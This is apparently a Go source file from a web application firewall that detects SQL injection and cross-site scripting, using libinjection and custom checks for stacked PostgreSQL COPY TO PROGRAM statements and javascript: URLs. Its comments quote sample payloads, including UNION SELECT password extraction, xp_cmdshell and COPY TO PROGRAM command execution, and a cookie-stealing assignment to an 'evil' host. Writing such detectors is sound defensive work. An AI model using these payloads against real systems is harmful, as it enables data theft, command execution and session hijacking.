package detect

import (
	"strings"

	libinjection "github.com/corazawaf/libinjection-go"

	"github.com/ergasterion-dev/aegolith/internal/model"
)

// SQLi reports whether v looks like SQL injection. It checks v and, when one
// percent-decoding pass changes it, the decoded value too.
func SQLi(v string) (Hit, bool) {
	if valueOrDecoded(v, isSQLi) {
		return Hit{RuleID: "AEG-SQLI-001", Category: model.CatSQLi, Severity: model.SeverityCritical}, true
	}
	return Hit{}, false
}

// XSS reports whether v looks like cross-site scripting. It checks v and,
// when one percent-decoding pass changes it, the decoded value too.
func XSS(v string) (Hit, bool) {
	if valueOrDecoded(v, isXSS) {
		return Hit{RuleID: "AEG-XSS-001", Category: model.CatXSS, Severity: model.SeverityHigh}, true
	}
	return Hit{}, false
}

func isSQLi(s string) bool {
	if ok, fp := libinjection.IsSQLi(s); ok && !isProseNumberComment(s, fp) {
		return true
	}
	return hasStackedCopyProgram(s) || sqliFromKeywordStarts(s)
}

// maxSQLiStarts caps the extra libinjection calls sqliFromKeywordStarts
// makes on one value (one window, for a value the engine scans in windows).
const maxSQLiStarts = 8

// sqliStart is one candidate start offset for sqliFromKeywordStarts: start
// is where libinjection reads from, kwEnd is just past the keyword that
// made it a candidate.
type sqliStart struct {
	start, kwEnd int
	union        bool
}

// sqliFromKeywordStarts finds a quote-free SQL injection that plain words in
// front of it hide from libinjection, e.g. "please send 1 UNION SELECT
// password FROM users--" or "milk 1; DROP TABLE orders;--". libinjection
// fingerprints a value from its first byte, so the leading words change the
// fingerprint; read from the "1" (or from "UNION") the same text is flagged.
//
// Candidate starts are SQL keywords (union, select, drop, insert, update,
// delete, or, and, waitfor, exec, declare) that begin a word after a blank,
// a ';' or the end of an inline comment ("x 1/**/UNION/**/SELECT"). When
// the keyword directly follows a number ("1 UNION", "1; DROP", "1 OR"),
// libinjection reads from the number instead, which is how such a payload
// closes a numeric context. Numbers alone are never candidates, so a run of
// "1 1 1 ..." cannot use up the cap.
//
// Prose is full of these keywords, so a suffix hit counts only in two
// statement shapes prose does not write:
//
//   - its fingerprint holds UNION followed by a SELECT-class expression
//     ("UE"): "1 UNION SELECT password FROM users". "please union select the
//     best one" has no such fingerprint.
//   - the value ends in a SQL comment that truncates the rest of the query
//     ("--" followed by no letters, or an unclosed "/*"), and SQL syntax
//     sits between the keyword and that comment (see sqlSyntaxAt): "1 OR
//     1=1--", "1; DROP TABLE orders;--", "1 AND SLEEP(5)--", "1; EXEC
//     xp_cmdshell 'dir'--". Prose such as "pick 2 or 3 --", "call me at 9;
//     drop me a line --" or "ok 1 and 2, thanks --" has none, and "Pack of
//     2 -- fresh" has letters after the comment.
//
// Without a trailing comment only UNION keywords are candidates. A
// fingerprint shorter than three tokens (a lone "1c": "only 10 -- limited"
// read from "10") never counts, and isProseNumberComment applies as in
// isSQLi.
//
// Cost: one pass over s collects the candidates, keeping only the last
// maxSQLiStarts before the trailing comment (an injection sits at the end of
// the value, in front of the comment that hides the rest of the query, so
// leading padding cannot push it out); then at most maxSQLiStarts
// libinjection calls, each on a suffix of s and linear in its length. Total
// work is O(maxSQLiStarts * len(s)), linear in len(s). An attacker who places
// more than maxSQLiStarts keywords between the payload and the comment
// evades this rule; the payload itself then ends in SQL that the suffix
// reads would flag in most shapes.
func sqliFromKeywordStarts(s string) bool {
	end, tail := trailingSQLComment(s)
	var ring [maxSQLiStarts]sqliStart
	n := 0
	lastSyntax := -1
	for i := 0; i < end; i++ {
		c := s[i]
		if sqlSyntaxAt(s[:end], i) {
			lastSyntax = i
		}
		if i == 0 || !isBlank(s[i-1]) && s[i-1] != ';' && !strings.HasSuffix(s[:i], "*/") || !isLetter(c) {
			continue
		}
		j := i
		for j < end && isIdentByte(s[j]) {
			j++
		}
		kw := s[i:j]
		union := strings.EqualFold(kw, "union")
		if union || tail && isSQLiStartKeyword(kw) {
			ring[n%maxSQLiStarts] = sqliStart{start: numberBefore(s, i), kwEnd: j, union: union}
			n++
		}
		i = j - 1
	}
	if tail {
		// A ';' that ends the last statement ("orders;--").
		k := end
		for k > 0 && isBlank(s[k-1]) {
			k--
		}
		if k > 0 && s[k-1] == ';' {
			lastSyntax = max(lastSyntax, k-1)
		}
	}
	for k := range min(n, maxSQLiStarts) {
		st := ring[k]
		sub := s[st.start:]
		ok, fp := libinjection.IsSQLi(sub)
		if !ok || len(fp) < 3 || isProseNumberComment(sub, fp) {
			continue
		}
		if st.union && strings.Contains(fp, "UE") || tail && lastSyntax >= st.kwEnd {
			return true
		}
	}
	return false
}

// trailingSQLComment reports whether s ends in a SQL comment that cuts off
// the rest of a query: a "--" followed by no letters ("--", "-- -", "--+")
// or a "/*" that never closes. end is where that comment starts, or len(s).
func trailingSQLComment(s string) (end int, ok bool) {
	end = len(s)
	if i := strings.LastIndex(s, "--"); i >= 0 && !hasLetter(s[i+2:]) {
		end, ok = i, true
	}
	if i := strings.LastIndex(s, "/*"); i >= 0 && i < end && !strings.Contains(s[i+2:], "*/") {
		end, ok = i, true
	}
	return end, ok
}

// numberBefore returns the start of a number token that directly precedes
// the word at s[i], separated by blanks and at most one ';' ("1 UNION",
// "1; DROP"), or i when there is none. It only walks back over the gap
// between the word and the token before it, so the walks of successive
// words never overlap.
func numberBefore(s string, i int) int {
	k := i
	for k > 0 && isBlank(s[k-1]) {
		k--
	}
	if k > 0 && s[k-1] == ';' {
		k--
		for k > 0 && isBlank(s[k-1]) {
			k--
		}
	}
	m := k
	for m > 0 && s[m-1] >= '0' && s[m-1] <= '9' {
		m--
	}
	if m == k || m > 0 && !isBlank(s[m-1]) && s[m-1] != ';' {
		return i
	}
	return m
}

func isSQLiStartKeyword(w string) bool {
	for _, k := range [...]string{"union", "select", "drop", "insert", "update", "delete", "or", "and", "waitfor", "exec", "declare"} {
		if strings.EqualFold(w, k) {
			return true
		}
	}
	return false
}

// sqlSyntaxAt reports whether s[i] is SQL syntax that prose does not write:
// a comparison operator with an operand directly on both sides ("1=1",
// "a<>b"), a '(' directly after a name ("SLEEP(5)", "pg_sleep("), or a
// quote that is not an apostrophe between two letters ("'dir'", but not
// "don't"). Commas, a '(' after a blank and a spaced "=" are left to prose.
// It looks only at s[i-1], s[i] and s[i+1].
func sqlSyntaxAt(s string, i int) bool {
	c := s[i]
	prev, next := byte(' '), byte(' ')
	if i > 0 {
		prev = s[i-1]
	}
	if i+1 < len(s) {
		next = s[i+1]
	}
	switch c {
	case '=', '<', '>':
		return !isBlank(prev) && !isBlank(next)
	case '(':
		return isIdentByte(prev)
	case '\'', '"':
		return !isLetter(prev) || !isLetter(next)
	}
	return false
}

func isLetter(c byte) bool { return c|0x20 >= 'a' && c|0x20 <= 'z' }

func hasLetter(s string) bool {
	for i := 0; i < len(s); i++ {
		if isLetter(s[i]) {
			return true
		}
	}
	return false
}

// isProseNumberComment reports whether a libinjection hit with fingerprint
// "1c" (a number followed by a comment) is prose such as "10% off --
// limited": a letter appears before the comment token. libinjection folds
// the words in between away, so "10% off --" and "5--" share the
// fingerprint, but only the bare form ("5--", "1 /* x */") is an injection
// that comments out the rest of a query; those keep matching. A typed
// integer field still rejects "10% off --" through its schema.
func isProseNumberComment(s, fp string) bool {
	if fp != "1c" {
		return false
	}
	end := len(s)
	for _, tok := range [...]string{"--", "/*", "#"} {
		if n := strings.Index(s, tok); n >= 0 && n < end {
			end = n
		}
	}
	for i := 0; i < end; i++ {
		if c := s[i] | 0x20; c >= 'a' && c <= 'z' {
			return true
		}
	}
	return false
}

func isXSS(s string) bool {
	return libinjection.IsXSS(s) || isScriptURL(s)
}

// hasStackedCopyProgram finds a stacked PostgreSQL "COPY ... TO|FROM PROGRAM"
// statement, which runs a shell command on the database host, e.g.
// "'; COPY (SELECT ”) TO PROGRAM 'id'--". libinjection has no COPY keyword
// and reads it as plain words, so it misses this. The match follows the
// statement's grammar to stay off prose: a ';', then COPY, then either a
// parenthesised query or one table name with an optional column list, then
// TO or FROM, PROGRAM and a quoted command. "Meet at 5; copy the list to
// program 'abc'" does not match (two words between COPY and TO).
//
// The scan never looks at a ';' inside a parenthesis group or comment that
// an earlier COPY already parsed (it does not start a statement there), and
// stops at the first group or comment that never closes (everything after it
// is inside). That keeps it linear on input such as a long repetition of
// ";copy(".
func hasStackedCopyProgram(s string) bool {
	for i := strings.IndexByte(s, ';'); i >= 0; {
		match, end := copyProgramAt(s, i+1)
		if match {
			return true
		}
		if end < 0 {
			return false
		}
		from := max(i+1, end)
		n := strings.IndexByte(s[from:], ';')
		if n < 0 {
			return false
		}
		i = from + n
	}
	return false
}

// copyProgramAt reports whether a COPY ... TO|FROM PROGRAM statement starts
// at s[i]. end is how far it parsed, or -1 when a parenthesis group or
// comment it entered never closes.
func copyProgramAt(s string, i int) (match bool, end int) {
	if i, _ = skipSQLSpace(s, i); i < 0 {
		return false, -1
	}
	if !wordAt(s, i, "copy") {
		return false, i
	}
	i += len("copy")
	i, sep := skipSQLSpace(s, i)
	switch {
	case i < 0:
		return false, -1
	case i < len(s) && s[i] == '(':
		if i = skipParens(s, i); i < 0 {
			return false, -1
		}
	case sep:
		start := i
		for i < len(s) && (isIdentByte(s[i]) || s[i] == '.' || s[i] == '"') {
			i++
		}
		if i == start {
			return false, i
		}
		j, _ := skipSQLSpace(s, i)
		if j < 0 {
			return false, -1
		}
		if j < len(s) && s[j] == '(' {
			if i = skipParens(s, j); i < 0 {
				return false, -1
			}
		}
	default:
		return false, i
	}
	if i, _ = skipSQLSpace(s, i); i < 0 {
		return false, -1
	}
	switch {
	case wordAt(s, i, "to"):
		i += len("to")
	case wordAt(s, i, "from"):
		i += len("from")
	default:
		return false, i
	}
	i, sep = skipSQLSpace(s, i)
	if i < 0 {
		return false, -1
	}
	if !sep || !wordAt(s, i, "program") {
		return false, i
	}
	if i, _ = skipSQLSpace(s, i+len("program")); i < 0 {
		return false, -1
	}
	if i < len(s) && (s[i] == 'e' || s[i] == 'E') {
		i++ // E'...' escape-string literal
	}
	return i < len(s) && (s[i] == '\'' || s[i] == '$'), i
}

// skipSQLSpace skips whitespace and /* */ comments from i. sep reports
// whether anything was skipped. next is -1 when a comment never closes.
func skipSQLSpace(s string, i int) (next int, sep bool) {
	start := i
	for i < len(s) {
		switch {
		case s[i] == ' ' || s[i] == '\t' || s[i] == '\n' || s[i] == '\r' || s[i] == '\f' || s[i] == '\v':
			i++
		case strings.HasPrefix(s[i:], "/*"):
			end := strings.Index(s[i+2:], "*/")
			if end < 0 {
				return -1, true
			}
			i += 2 + end + 2
		default:
			return i, i > start
		}
	}
	return i, i > start
}

// skipParens returns the index just past the parenthesis group opening at
// s[i], skipping single-quoted strings, or -1 when it is not closed.
func skipParens(s string, i int) int {
	depth := 0
	inQuote := false
	for ; i < len(s); i++ {
		c := s[i]
		switch {
		case inQuote:
			if c == '\'' {
				inQuote = false
			}
		case c == '\'':
			inQuote = true
		case c == '(':
			depth++
		case c == ')':
			depth--
			if depth == 0 {
				return i + 1
			}
		}
	}
	return -1
}

// wordAt reports whether the ASCII word w (lower case) starts at s[i],
// case-insensitively, and is not followed by another identifier byte.
func wordAt(s string, i int, w string) bool {
	if i+len(w) > len(s) || !strings.EqualFold(s[i:i+len(w)], w) {
		return false
	}
	return i+len(w) == len(s) || !isIdentByte(s[i+len(w)])
}

func isIdentByte(c byte) bool {
	return c == '_' || c >= '0' && c <= '9' || c >= 'a' && c <= 'z' || c >= 'A' && c <= 'Z'
}

// isScriptURL reports whether the whole value is a javascript: or vbscript:
// URL that runs code, e.g. "javascript:alert(1)" submitted as a link that is
// later rendered into an href. libinjection only flags such URLs inside an
// HTML attribute it can see, so a bare value slips through.
//
// Browsers ignore leading whitespace/control characters and tabs or
// newlines inside the scheme, so those are skipped too. To stay off prose
// such as the book title "JavaScript: The Good Parts", the scheme must be
// followed by code: an optional dotted identifier chain directly followed
// by '(', '`' or '=' (alert(1), window.location=...), or a '/' comment
// opener (javascript://%0Aalert(1)). HTML whitespace character references
// (&#9;, &#x0A;, &Tab;, ...) count as the whitespace they stand for, since a
// value written raw into an href is entity-decoded before the URL is read.
func isScriptURL(s string) bool {
	if strings.IndexByte(s, '&') >= 0 {
		s = decodeWhitespaceRefs(s)
	}
	i := 0
	for i < len(s) && s[i] <= ' ' {
		i++
	}
	var ok bool
	if i, ok = schemeAt(s, i, "javascript:"); !ok {
		if i, ok = schemeAt(s, i, "vbscript:"); !ok {
			return false
		}
	}
	for i < len(s) && (s[i] == ' ' || s[i] == '\t' || s[i] == '\n' || s[i] == '\r') {
		i++
	}
	if i < len(s) && s[i] == '/' {
		return true
	}
	// Only a literal space counts: browsers strip tab, CR and LF inside a
	// URL, so "javascript:\tlocation=name" is not prose.
	spaced := i > 0 && s[i-1] == ' '
	start := i
	dotted := false
	for i < len(s) && (isIdentByte(s[i]) || s[i] == '$' || s[i] == '.') {
		dotted = dotted || s[i] == '.'
		i++
	}
	if i == start || i >= len(s) {
		return false
	}
	switch s[i] {
	case '(', '`':
		return true
	case '=':
		// "javascript:location=..." and "javascript: document.cookie=..."
		// run code; "JavaScript: version=ES6" after a space, assigning a
		// bare name, is how prose writes a key and value, unless the name
		// is a browser global (assigning it navigates) or the rest holds
		// a call, template or statement ("a=1;alert(1)", "x=alert,x(1)").
		if !spaced || dotted {
			return true
		}
		rhs := s[i+1:]
		return isBrowserGlobal(s[start:i]) && !isInertWord(rhs) || hasCodeAfterAssign(rhs)
	}
	return false
}

// isInertWord reports whether rhs starts with a plain word that ends at a
// blank or the end of the value and is not a browser global: as a script,
// "top=10 tips" or "name=Ali" is at most a ReferenceError, while
// "location=name" navigates.
func isInertWord(rhs string) bool {
	j := 0
	for j < len(rhs) && isIdentByte(rhs[j]) {
		j++
	}
	if j == 0 || isBrowserGlobal(rhs[:j]) {
		return false
	}
	return j == len(rhs) || rhs[j] == ' ' || rhs[j] == '\t' || rhs[j] == '\n' || rhs[j] == '\r'
}

// hasCodeAfterAssign reports whether the text after "name=" holds a template
// literal, a call ('(' right after an identifier, ')' or ']': "alert(1)",
// "x(1)"), a statement separator followed directly by more code
// ("1;alert(1)"), or a later statement, after "; " or ", ", that is code
// itself (see isCodeStatement: "a=1; location=name"). Prose writes
// "level=beginner (2 weeks)" and "a=1; b=2", with a blank before '(' and
// after ';', and its later clauses are plain words.
func hasCodeAfterAssign(rhs string) bool {
	for j := 0; j < len(rhs); j++ {
		switch rhs[j] {
		case '`':
			return true
		case '(':
			if j > 0 && (isIdentByte(rhs[j-1]) || rhs[j-1] == ')' || rhs[j-1] == ']') {
				return true
			}
		case ';', ',':
			k := j + 1
			for k < len(rhs) && isBlank(rhs[k]) {
				k++
			}
			if rhs[j] == ';' && k == j+1 && k < len(rhs) {
				return true
			}
			if k > j+1 && isCodeStatement(rhs[k:], rhs[j] == ';') {
				return true
			}
		}
	}
	return false
}

func isBlank(c byte) bool { return c == ' ' || c == '\t' || c == '\n' || c == '\r' }

// isCodeStatement reports whether st starts a JavaScript statement that does
// something: a dotted name assigned, called or indexed ("top.location=name",
// "document.location='//x'"), a name called with blanks before '(' or
// tagged with a template ("alert (1)", "alert`1`"; a blank before '(' only
// counts after ';', since "a=1, duration (2 weeks)" is prose), or a browser global
// assigned a value that is not an inert word ("location=name",
// "location='//evil/?'+document.cookie"). "b=2", "maybe", "e.g. later" and
// "name=Ali" are not.
func isCodeStatement(st string, afterSemi bool) bool {
	i, dotted := 0, false
	for i < len(st) && (isIdentByte(st[i]) || st[i] == '$' || st[i] == '.') {
		dotted = dotted || st[i] == '.'
		i++
	}
	if i == 0 {
		return false
	}
	name := st[:i]
	for i < len(st) && (st[i] == ' ' || st[i] == '\t') {
		i++
	}
	if i >= len(st) {
		return false
	}
	switch st[i] {
	case '`':
		return true
	case '(':
		return afterSemi || i == len(name)
	case '[':
		return dotted
	case '=':
		if i+1 < len(st) && st[i+1] == '=' {
			return false // a comparison, not an assignment
		}
		rhs := st[i+1:]
		return dotted && strings.TrimLeft(rhs, " \t") != "" || isBrowserGlobal(name) && !isInertWord(rhs)
	}
	return false
}

// decodeWhitespaceRefs replaces the HTML character references for tab, LF
// and CR (&#9;, &#09;, &#x9;, &#X0A;, &#10;, &#13;, &Tab;, &NewLine; and
// their forms without the closing ';') with the bytes they stand for.
// Other references are left as they are.
func decodeWhitespaceRefs(s string) string {
	var b strings.Builder
	last := 0
	for i := 0; i < len(s); i++ {
		if s[i] != '&' {
			continue
		}
		c, n := whitespaceRefAt(s[i:])
		if n == 0 {
			continue
		}
		if b.Len() == 0 {
			b.Grow(len(s))
		}
		b.WriteString(s[last:i])
		b.WriteByte(c)
		i += n - 1
		last = i + 1
	}
	if last == 0 {
		return s
	}
	b.WriteString(s[last:])
	return b.String()
}

// whitespaceRefAt matches a whitespace character reference at the start of
// s ("&..."). It returns the byte and the reference length, or 0, 0.
func whitespaceRefAt(s string) (byte, int) {
	for _, r := range [...]struct {
		name string
		c    byte
	}{{"&Tab;", '\t'}, {"&NewLine;", '\n'}} {
		if strings.HasPrefix(s, r.name) {
			return r.c, len(r.name)
		}
	}
	if len(s) < 3 || s[1] != '#' {
		return 0, 0
	}
	j, base := 2, 10
	if s[j] == 'x' || s[j] == 'X' {
		j, base = 3, 16
	}
	start, v := j, 0
	for ; j < len(s) && j-start < 8; j++ {
		d := hexVal(s[j])
		if d < 0 || d >= base {
			break
		}
		v = v*base + d
	}
	if j == start {
		return 0, 0
	}
	if j < len(s) && s[j] == ';' {
		j++
	}
	switch v {
	case 9, 10, 13:
		return byte(v), j
	}
	return 0, 0
}

func hexVal(c byte) int {
	switch {
	case c >= '0' && c <= '9':
		return int(c - '0')
	case c >= 'a' && c <= 'f':
		return int(c-'a') + 10
	case c >= 'A' && c <= 'F':
		return int(c-'A') + 10
	}
	return -1
}

// isBrowserGlobal reports whether name is a window property whose
// assignment navigates or replaces the page. JavaScript names are case
// sensitive, so "Name=Ali" in prose is not one.
func isBrowserGlobal(name string) bool {
	switch name {
	case "location", "top", "self", "parent", "window", "document", "opener", "name":
		return true
	}
	return false
}

// schemeAt matches the lower-case scheme at s[i] case-insensitively,
// ignoring tab, CR and LF between its letters as browsers do. It returns the
// index after the match, or i unchanged and false.
func schemeAt(s string, i int, scheme string) (int, bool) {
	j := i
	for k := 0; k < len(scheme); j++ {
		if j >= len(s) {
			return i, false
		}
		c := s[j]
		if c == '\t' || c == '\n' || c == '\r' {
			continue
		}
		if c >= 'A' && c <= 'Z' {
			c += 'a' - 'A'
		}
		if c != scheme[k] {
			return i, false
		}
		k++
	}
	return j, true
}
